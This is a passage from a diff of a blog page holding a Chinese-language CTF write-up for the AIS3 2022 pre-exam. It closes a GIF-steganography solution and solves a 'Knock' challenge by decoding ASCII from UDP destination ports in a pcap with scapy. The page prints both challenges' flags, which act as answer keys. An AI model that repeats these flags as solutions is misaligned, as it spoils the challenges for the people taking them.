+        <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">im</span><span class="p">.</span><span class="n">info</span><span class="p">[</span><span class="s">'duration'</span><span class="p">]</span> <span class="o">//</span> <span class="mi">10</span><span class="p">)</span>
+        <span class="n">im</span><span class="p">.</span><span class="n">seek</span><span class="p">(</span><span class="n">im</span><span class="p">.</span><span class="n">tell</span><span class="p">()</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
+    <span class="k">pass</span>
+   
+<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">AIS3{5T3g4n0gR4pHy_c4N_b3_fUn_s0m37iMe}</code></p>
+
+<h3 id="knock">Knock</h3>
+
+<ol>
+  <li>根據題目猜測 knock 應該是指 server 會嘗試透過網路戳參賽者的機器，因此用 Wireshark listen 在 VPN 的 interface，發現有一些多的 UDP 封包。
+<img width="800" alt="knock-udp-packets" src="https://user-images.githubusercontent.com/38059464/176883739-82d28564-3957-4386-be14-5371673d6285.png" /></li>
+  <li>
+    <p>觀察發現 UDP packet 的 dest. port 最後兩位數都在 ASCII 範圍內，且前四個封包 <code class="language-plaintext highlighter-rouge">63 73 83 51</code> 便是 <code class="language-plaintext highlighter-rouge">AIS3</code>，因此拉出來即是 flag。這題感覺有點通靈，但其實是一種 exfiltration 的方法。</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">scapy.all</span> <span class="k">as</span> <span class="n">scapy</span>
+   
+<span class="n">packets</span> <span class="o">=</span> <span class="n">scapy</span><span class="p">.</span><span class="n">rdpcap</span><span class="p">(</span><span class="s">'./knock.pcapng'</span><span class="p">)</span>
+   
+<span class="n">knock_packets</span> <span class="o">=</span> <span class="n">packets</span><span class="p">[</span><span class="n">scapy</span><span class="p">.</span><span class="n">UDP</span><span class="p">][</span><span class="mi">12</span><span class="p">:]</span>
+   
+<span class="n">flag</span> <span class="o">=</span> <span class="s">''</span>
+<span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">knock_packets</span><span class="p">:</span>
+    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">dport</span> <span class="o">-</span> <span class="mi">12000</span><span class="p">)</span>
+   
+<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">AIS3{kn0ckKNOCKknock}</code></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#ais3" class="page__taxonomy-item" rel="tag">ais3</a><span class="sep">, </span>
+    
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">ctf</a><span class="sep">, </span>
+    
+      <a href="/tags/#writeup" class="page__taxonomy-item" rel="tag">writeup</a>
+    
+    </span>
+  </p>
+
+
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-07-03T00:00:00+00:00">July 3, 2022</time></p>
+
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=AIS3+2022+Pre-exam+Writeup%20https%3A%2F%2Fice1187.github.io%2Fais3-2022-pre-exam-writeup%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fice1187.github.io%2Fais3-2022-pre-exam-writeup%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fice1187.github.io%2Fais3-2022-pre-exam-writeup%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/reinforcement-learning/find-pytorch-that-supports-your-gpu/" class="pagination--pager" title="How to Find PyTorch that supports your GPU
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/reinforcement-learning/find-pytorch-that-supports-your-gpu/" rel="permalink">How to Find PyTorch that supports your GPU
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2022-06-18T00:00:00+00:00">June 18, 2022</time>
+      </span>
+    
+
+    
+
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">If PyTorch shows the following messages, then it means your PyTorch doesn’t compile with a CUDA version compatible with your GPU.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/google-meet/" rel="permalink">調整 Google Meet 音量
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2022-05-26T00:00:00+00:00">May 26, 2022</time>
+      </span>
+    
+
+    
+
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">因為 Macbook 上預設沒有辦法單獨調整一個網頁的音量，所以想同時掛著 Google Meet，又一邊看 Youtube 的話，兩邊音量會互相打架。記錄一下怎麼調整 Google Meet 的音量:
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+          <li><a href="https://github.com/ice1187" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 Ice1187. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
